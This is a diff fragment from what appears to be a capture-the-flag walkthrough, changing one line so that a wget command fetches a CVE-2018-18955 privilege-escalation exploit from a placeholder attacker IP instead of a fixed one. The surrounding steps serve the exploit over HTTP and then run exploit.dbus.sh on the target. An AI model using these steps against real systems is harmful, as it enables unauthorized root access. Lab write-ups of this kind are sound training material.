@@ -172,7 +172,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 2. Download it in target machine using `wget -r `
 
 ```bash
-beth@london:~$ wget -r http://10.9.1.6:8000/CVE-2018-18955
+beth@london:~$ wget -r http://[YOUR_IP]:8000/CVE-2018-18955
 ```
 3. Change the permissions to be exectuable and run `exploit.dbus.sh`
 
